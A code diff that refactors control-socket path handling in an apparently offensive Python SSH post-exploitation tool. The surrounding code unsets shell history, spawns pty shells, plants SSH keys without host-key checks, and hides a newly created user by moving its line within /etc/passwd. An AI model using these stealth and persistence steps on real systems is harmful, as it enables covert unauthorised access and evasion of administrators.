@@ -10,6 +10,7 @@ import logging
 import random
 import string
 import shlex
+import glob
 import sys
 import os
 
@@ -41,7 +42,7 @@ def connect_host(host):
         return
 
     # Create SSH connection
-    if not socket_create(host):
+    if not socket_create(identity):
         return
 
     ACTIVE_CONNECTION = identity
@@ -77,12 +78,13 @@ def kill_host(host):
         logger.error('Invalid Host')
         return
 
-    if not socket_cmd(host, 'check'):
+    if not socket_cmd(identity, 'check'):
         logger.error('No active connection')
         return
 
-    socket_cmd(host, 'exit')
-    if os.path.exists(f'{SOCKET_PATH}/{host}'):
+    socket_cmd(identity, 'exit')
+    SOCKET_PATH = f'{OUTPUT_PATH}/{identity.HostName}/control_%r@%h:%p'
+    if os.path.exists(f'{SOCKET_PATH}'):
         logger.error('Problem killing connection')
         return
 
@@ -105,14 +107,14 @@ def port_forward(cmd, opts):
         logger.error(port_forward.__doc__)
         return
 
-    if not socket_cmd(ACTIVE_CONNECTION.name, 'check'):
+    if not socket_cmd(ACTIVE_CONNECTION, 'check'):
         logger.error('No active connection')
         return
 
     if cmd == '-K':
-        socket_cmd(ACTIVE_CONNECTION.name, 'cancel', opts)
+        socket_cmd(ACTIVE_CONNECTION, 'cancel', opts)
     else:
-        socket_cmd(ACTIVE_CONNECTION.name, 'forward', f'{cmd} {opts}')
+        socket_cmd(ACTIVE_CONNECTION, 'forward', f'{cmd} {opts}')
 
 
 def transfer_file(direction, args):
@@ -123,7 +125,7 @@ def transfer_file(direction, args):
         !put <local_path> <remote_path>
     '''
 
-    if not socket_cmd(ACTIVE_CONNECTION.name, 'check'):
+    if not socket_cmd(ACTIVE_CONNECTION, 'check'):
         logger.error('No active connection')
         return
 
@@ -134,6 +136,8 @@ def transfer_file(direction, args):
             logger.error('Must specify full path')
             return
 
+    SOCKET_PATH = f'{OUTPUT_PATH}/{ACTIVE_CONNECTION.HostName}/control_%r@%h:%p'
+
     if direction == 'get':
         if len(paths) != 1:
             logger.info(transfer_file.__doc__)
@@ -141,12 +145,12 @@ def transfer_file(direction, args):
 
         path = paths[0]
 
-        local_path = f'{OUTPUT_PATH}/downloads/{ACTIVE_CONNECTION.name}{path}'
+        local_path = f'{OUTPUT_PATH}/downloads/{ACTIVE_CONNECTION.HostName}{path}'
         if not os.path.exists(local_path):
            os.makedirs(local_path)
 
         logger.info(f'Downloading to {local_path}')
-        command = f'scp -rp -o ControlPath={SOCKET_PATH}/{ACTIVE_CONNECTION.name} {ACTIVE_CONNECTION.name}:{path} {local_path}'
+        command = f'scp -rp -o ControlPath={SOCKET_PATH} {ACTIVE_CONNECTION.name}:{path} {local_path}'
 
     elif direction == 'put':
         if len(paths) != 2:
@@ -156,7 +160,7 @@ def transfer_file(direction, args):
         from_path, to_path = paths
 
         logger.info(f'FROM {from_path} TO {to_path}')
-        command = f'scp -rp -o ControlPath={SOCKET_PATH}/{ACTIVE_CONNECTION.name} {from_path} {ACTIVE_CONNECTION.name}:{to_path}'
+        command = f'scp -rp -o ControlPath={SOCKET_PATH} {from_path} {ACTIVE_CONNECTION.name}:{to_path}'
 
     try:
         logger.debug(command)
@@ -166,7 +170,7 @@ def transfer_file(direction, args):
 
 
 def interactive_shell():
-    if not socket_cmd(ACTIVE_CONNECTION.name, 'check'):
+    if not socket_cmd(ACTIVE_CONNECTION, 'check'):
         logger.error('No active connection')
         return
 
@@ -177,14 +181,15 @@ def interactive_shell():
     rows = int(tty_val[1].split()[-1])
     columns = int(tty_val[2].split()[-1])
 
-    command = f"stty raw -echo; (echo unset HISTFILE; echo export TERM={os.environ['TERM']}; echo stty rows {rows} columns {columns}; echo reset; cat) | ssh {SSH_OPTS} -S {SOCKET_PATH}/{ACTIVE_CONNECTION.name} {ACTIVE_CONNECTION.name} "
+    SOCKET_PATH = f'{OUTPUT_PATH}/{ACTIVE_CONNECTION.HostName}/control_%r@%h:%p'
+    command = f"stty raw -echo; (echo unset HISTFILE; echo export TERM={os.environ['TERM']}; echo stty rows {rows} columns {columns}; echo reset; cat) | ssh {SSH_OPTS} -S {SOCKET_PATH} {ACTIVE_CONNECTION.name} "
     # Pre-checks
     # python ?
-    if execute('python -V', ACTIVE_CONNECTION.name).find(b'non-zero exit status') == -1:
+    if execute('python -V', ACTIVE_CONNECTION).find(b'non-zero exit status') == -1:
         command += '"python -c \'import pty;pty.spawn(\\\"/bin/bash\\\");exit()\'"'
 
     # python3 ?
-    elif execute('python3 -V', ACTIVE_CONNECTION.name).find(b'non-zero exit status') == -1:
+    elif execute('python3 -V', ACTIVE_CONNECTION).find(b'non-zero exit status') == -1:
         command += '"python3 -c \'import pty;pty.spawn(\\\"/bin/bash\\\");exit()\'"'
 
     else:
@@ -204,15 +209,23 @@ def get_active_host():
     '''
     global ACTIVE_CONNECTIONS
 
-    try:
-        active = []
-        for conn in [host_lookup(x) for x in os.listdir(SOCKET_PATH)]:
-            active.append(conn)
-            logger.info(conn.name)
-        ACTIVE_CONNECTIONS = active
-    except FileNotFoundError:
-        del ACTIVE_CONNECTIONS[:]
-        return # no active
+    active = []
+    table = PrettyTable()
+    table.field_names = field_names
+    table.border = False
+    table.align = 'l'
+
+    CONTROL_FILES = f'{OUTPUT_PATH}/**/control_*'
+    for control_file in glob.glob(CONTROL_FILES):
+        ip = control_file.split('/')[-2]
+        user = control_file.split('/')[-1].split('_')[-1].split('@')[0]
+        host = hostname_lookup(ip, user)
+        if host is None:
+            continue
+        table.add_row([host.name, host.HostName, host.User, host.Port, host.IdentityFile, host.ProxyJump])
+        active.append(host)
+    ACTIVE_CONNECTIONS = active
+    logger.info(table)
 
 
 def set_host(args):
@@ -308,13 +321,13 @@ def create_user(user):
         logger.error(create_user.__doc__)
         return
 
-    if not socket_cmd(ACTIVE_CONNECTION.name, 'check'):
+    if not socket_cmd(ACTIVE_CONNECTION, 'check'):
         logger.error('No active connection')
         return
 
     # Check if user has perms
     if ACTIVE_CONNECTION.User != 'root':
-        if execute('sudo -v', ACTIVE_CONNECTION.name).find(b'non-zero exit status') == -1:
+        if execute('sudo -v', ACTIVE_CONNECTION).find(b'non-zero exit status') == -1:
             logger.error(f'sudo command does not exist')
             return
 
@@ -336,7 +349,7 @@ def create_user(user):
     try:
         for command in commands:
             logging.debug(command)
-            execute(command, ACTIVE_CONNECTION.name)
+            execute(command, ACTIVE_CONNECTION)
     except Exception as e:
         logger.error(str(e))
         return
@@ -346,14 +359,14 @@ def create_user(user):
 
     get_line_num = f"cat /etc/passwd | sed -nr '/^{user}/=;' | tr -d '\n'"
     logger.debug(get_line_num)
-    line_num = int(execute(get_line_num, ACTIVE_CONNECTION.name).decode())
+    line_num = int(execute(get_line_num, ACTIVE_CONNECTION).decode())
 
     new_line_num = line_num - random.randint(8, 15)
     logger.info(f'Moving to line: {new_line_num}')
 
     move_line = f"printf '%s\\n' '{line_num}m{new_line_num}' 'wq' | ex -s /etc/passwd"
     logger.debug(move_line)
-    execute(move_line, ACTIVE_CONNECTION.name)
+    execute(move_line, ACTIVE_CONNECTION)
 
 
 def add_keys():
@@ -361,7 +374,7 @@ def add_keys():
     Generate SSH Keys and upload them
     '''
 
-    if not socket_cmd(ACTIVE_CONNECTION.name, 'check'):
+    if not socket_cmd(ACTIVE_CONNECTION, 'check'):
         logger.error('No active connection')
         return
 
@@ -385,7 +398,8 @@ def add_keys():
 
     # Add key to authorized_keys
     try:
-        command = f'ssh-copy-id -i {priv_key} -o ControlPath={SOCKET_PATH}/{ACTIVE_CONNECTION.name} -o StrictHostKeyChecking=no {ACTIVE_CONNECTION.User}@{ACTIVE_CONNECTION.name}'
+        SOCKET_PATH = f'{OUTPUT_PATH}/{ACTIVE_CONNECTION.HostName}/control_%r@%h:%p'
+        command = f'ssh-copy-id -i {priv_key} -o ControlPath={SOCKET_PATH} -o StrictHostKeyChecking=no {ACTIVE_CONNECTION.User}@{ACTIVE_CONNECTION.name}'
         logger.debug(command)
         subprocess.call(command, shell=True)
     except Exception as e:
@@ -398,14 +412,9 @@ def main():
 
     load_config()
 
-    try:
-        for host in os.listdir(SOCKET_PATH):
-            ident = host_lookup(host)
-            if host == ident.name:
-                ACTIVE_CONNECTIONS.append(ident)
-    except FileNotFoundError:
-        pass
-
+    CONTROL_FILES = f'{OUTPUT_PATH}/**/control_*'
+    for conn in [host_lookup(x.split('/')[-2]) for x in glob.glob(CONTROL_FILES)]:
+        ACTIVE_CONNECTIONS.append(conn)
 
     prompt = Prompt()
 
@@ -417,7 +426,7 @@ def main():
                     if not command:
                         continue
 
-                    execute(command, ACTIVE_CONNECTION.name)
+                    execute(command, ACTIVE_CONNECTION)
                 else:
                     valid_cmds = '\n\t'.join(prompt.completer.options.keys())
                     logger.error(f'Valid commands are: {chr(10)}{chr(9)}{valid_cmds}')
@@ -456,8 +465,6 @@ def main():
                         kill_host(args)
                     elif command == 'set':
                         set_host(args)
-                    elif command == 'hosts':
-                        set_host('')
 
 
         except (KeyboardInterrupt, EOFError) as e:
